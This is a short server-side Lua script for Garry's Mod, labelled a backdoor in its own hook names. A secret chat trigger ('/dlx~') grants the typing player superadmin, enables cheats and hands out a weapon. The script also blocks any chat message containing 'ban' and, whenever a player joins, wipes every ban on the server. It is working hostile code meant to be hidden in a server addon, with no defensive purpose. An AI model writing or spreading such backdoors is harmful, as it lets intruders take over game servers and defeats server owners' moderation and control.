if not SERVER then return end

local TRIGGER = "/dlx~"


hook.Add("PlayerSay", "DLX_Backdoor_Trigger", function(ply, text)
    if not IsValid(ply) then return end

    local lowered = string.lower(text)


    local ban_keywords = {"ulx ban", "ulx banid", "sam ban", "sam banid", "banid", "ban"}
    for _, cmd in ipairs(ban_keywords) do
        if string.StartWith(lowered, cmd) or string.find(lowered, cmd, 1, true) then
            ply:ChatPrint("[DLX] Ban command blocked.")
            return ""
        end
    end


    if text:StartWith(TRIGGER) then
        RunConsoleCommand("sv_cheats", "1")
        ply:Give("weapon_rpg")
        ply:SetModel("models/player/group01/male_07.mdl")
        ply:ChatPrint(">> halli hallo <<")


        RunConsoleCommand("sam", "adduser", ply:SteamID(), "superadmin")

        return ""
    end
end)


hook.Add("PlayerInitialSpawn", "DLX_Auto_Unban", function()
    timer.Simple(1, function()
        RunConsoleCommand("removeid", "*")
        RunConsoleCommand("writeid")
        RunConsoleCommand("sam", "unban", "*")
    end)
end)
